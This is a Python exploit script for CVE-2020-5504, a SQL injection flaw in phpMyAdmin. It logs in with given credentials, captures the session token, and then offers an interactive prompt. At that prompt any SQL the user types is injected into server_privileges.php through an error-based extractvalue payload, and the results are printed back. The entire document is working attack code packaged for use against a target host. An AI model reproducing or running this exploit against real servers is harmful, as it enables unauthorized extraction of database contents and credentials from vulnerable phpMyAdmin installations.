#/usr/bin/python3
# -*- coding: utf-8 -*-
#2020/12/09/15:24
#Marmot

import requests
import re
import optparse

def log_token(Host,Ports,username,passwd):
    try:
        url = Host + ':' + Ports
        data = {
            'pma_username':username,
            'pma_password':passwd,
            'server':'1',
            'target':'index.php'
        }
        s = requests.session()
        r = s.post(url,data=data,timeout=1)
        token_data = r.text
        token = str(re.search(r'(\w{32})',token_data).group())
        print(f"[+] {token}")
    except:
        print("Login Error")
        exit(0)

    while True:
        sqlcom = input("sql> ")
        if sqlcom == "exit":
            print("bye!")
            break
        else:
            exp_command = url + "/server_privileges.php?ajax_request=true&validate_username=1&username=1'and extractvalue(1,concat(0x7e,(" + sqlcom + "),0x7e))--+db=&token=" + token +"&viewing_mode=server"
            r = s.get(exp_command)
            sql_word = r.text
            if sql_word == '{"redirect_flag":"1","success":false,"error":""}':
                print(f"Login failed! \nusername: {username} password: {passwd}")
            else:
                take_data(sql_word)

def take_data(sql_data):
    try:
        w = str(re.search(r"'~(.+)~'",sql_data).group())
        print(w)
    except:
        print("Sorry ~ cannot execute this command.")

def main():
    usage = "python3 phpmyadmin.py -H http://127.0.0.1 -P 8888 -u root -p root"
    parser = optparse.OptionParser(usage)
    parser.add_option('-H',dest='Host',type='string',help='tagget host')
    parser.add_option('-P',dest='Ports',type='string',help='target Port',default='80')
    parser.add_option('-u',dest='user',type='string',help='username')
    parser.add_option('-p',dest='passwd',type='string',help='password')
    (options,args) = parser.parse_args()
    Host = options.Host
    Ports = options.Ports
    username = options.user
    passwd = options.passwd

    print('''
       _                                     _           _       
 _ __ | |__  _ __  _ __ ___  _   _  __ _  __| |_ __ ___ (_)_ __  
| '_ \| '_ \| '_ \| '_ ` _ \| | | |/ _` |/ _` | '_ ` _ \| | '_ \ 
| |_) | | | | |_) | | | | | | |_| | (_| | (_| | | | | | | | | | |
| .__/|_| |_| .__/|_| |_| |_|\__, |\__,_|\__,_|_| |_| |_|_|_| |_|
|_|         |_|              |___/                  CVE-2020-5504                       
    ''')

    if Host == None or Ports == None or username == None or passwd == None:
        print("[*] phpmyadmin Background SQL injection vulnerability（CVE-2020-5504）")
        print("[-] Host,Ports,User and Password cannot be empty. ")
    else:
        print("[*] phpmyadmin Background SQL injection vulnerability（CVE-2020-5504)")
        print("[+] ---------------start--------------------")
        log_token(Host,Ports,username,passwd)

if __name__ == "__main__":
    main()
